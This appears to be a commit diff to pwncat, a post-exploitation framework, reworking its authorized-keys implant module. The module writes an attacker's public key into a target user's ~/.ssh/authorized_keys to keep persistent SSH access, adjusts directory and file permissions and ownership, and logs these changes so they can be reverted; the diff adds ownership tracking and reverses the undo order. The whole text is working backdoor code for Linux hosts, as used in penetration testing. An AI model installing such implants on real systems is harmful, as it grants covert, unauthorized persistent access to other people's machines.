@@ -9,6 +9,7 @@ from pwncat.facts.tamper import (
     CreatedFile,
     ReplacedFile,
     CreatedDirectory,
+    ModifiedOwnership,
     ModifiedPermissions,
 )
 from pwncat.platform.linux import Linux
@@ -29,7 +30,9 @@ class AuthorizedKeyImplant(PrivateKey):
         )
 
         self.pubkey = pubkey
-        self.tampers = tampers
+
+        # Use this as a stack like defers in Go
+        self.tampers = reversed(tampers)
 
     def title(self, session: "pwncat.manager.Session"):
         """Provide a human-readable description"""
@@ -50,15 +53,9 @@ class AuthorizedKeyImplant(PrivateKey):
         if current_user.id != self.uid and current_user.id != 0:
             raise ModuleFailed(f"must be [blue]root[/blue] or [blue]{user.name}[/blue]")
 
-        # Reverse the list of tampers like a stack
-        [
-            tamper.revert(session)
-            for tamper in reversed(self.tampers)
-            if tamper.revertable
-        ]
-        # Fix permissions (in case the file was replaced by the above write)
-        authkeys_path = session.platform.Path(user.home) / ".ssh" / "authorized_keys"
-        session.platform.chown(str(authkeys_path), user.id, user.gid)
+        for tamper in self.tampers:
+            if tamper.revertable:
+                tamper.revert(session)
 
 
 class Module(ImplantModule):
@@ -81,8 +78,8 @@ class Module(ImplantModule):
 
     def install(self, session: "pwncat.manager.Session", user, key):
 
-        # Keep track of all the tampers we have caused
-        tampers = list()
+        # Keep track of all the tampers local to the module
+        T = []
 
         yield Status("verifying user permissions")
         current_user = session.current_user()
@@ -125,16 +122,16 @@ class Module(ImplantModule):
         sshdir = session.platform.Path(user_info.home) / ".ssh"
         if not sshdir.is_dir():
             sshdir.mkdir(parents=True, exist_ok=True)
-            tampers.append(CreatedDirectory(self.name, user_info.id, sshdir))
+            T.append(CreatedDirectory(self.name, user_info.id, str(sshdir)))
 
         yield Status("fixing .ssh directory permissions")
-        mode = sshdir.stat().st_mode
-        if mode != 0o40700:
-            sshdir.chmod(0o40700)
-            tampers.append(ModifiedPermissions(self.name, user_info.id, sshdir, mode))
+        mode = sshdir.stat().st_mode % (1 << 9)
+        if mode != 0o700:
+            sshdir.chmod(0o700)
+            T.append(ModifiedPermissions(self.name, user_info.id, str(sshdir), mode))
 
         authkeys_path = sshdir / "authorized_keys"
-        tamper = CreatedFile(self.name, user_info.id, authkeys_path)
+        tamper = CreatedFile(self.name, user_info.id, str(authkeys_path))
 
         if authkeys_path.is_file():
             try:
@@ -142,7 +139,7 @@ class Module(ImplantModule):
                 with authkeys_path.open("r") as filp:
                     authkeys = filp.readlines()
                 tamper = ReplacedFile(
-                    self.name, user_info.id, authkeys_path, "\n".join(authkeys)
+                    self.name, user_info.id, str(authkeys_path), "\n".join(authkeys)
                 )
             except (FileNotFoundError, PermissionError) as exc:
                 raise ModuleFailed(str(exc)) from exc
@@ -156,19 +153,24 @@ class Module(ImplantModule):
             yield Status("patching authorized keys")
             with authkeys_path.open("w") as filp:
                 filp.writelines(authkeys)
-            tampers.append(tamper)
+            T.append(tamper)
         except (FileNotFoundError, PermissionError) as exc:
             raise ModuleFailed(str(exc)) from exc
 
         # Ensure correct permissions
         yield Status("fixing authorized keys permissions")
+        stat = authkeys_path.stat()
+        uid, gid = stat.st_uid, stat.st_gid
         session.platform.chown(str(authkeys_path), user_info.id, user_info.gid)
+        T.append(
+            ModifiedOwnership(self.name, user_info.id, str(authkeys_path), uid, gid)
+        )
 
         mode = authkeys_path.stat().st_mode
         if mode != 0o600:
-            tampers.append(
-                ModifiedPermissions(self.name, user_info.id, authkeys_path, mode)
+            T.append(
+                ModifiedPermissions(self.name, user_info.id, str(authkeys_path), mode)
             )
             authkeys_path.chmod(0o600)
 
-        return AuthorizedKeyImplant(self.name, user_info, key, pubkey, tampers)
+        return AuthorizedKeyImplant(self.name, user_info, key, pubkey, T)
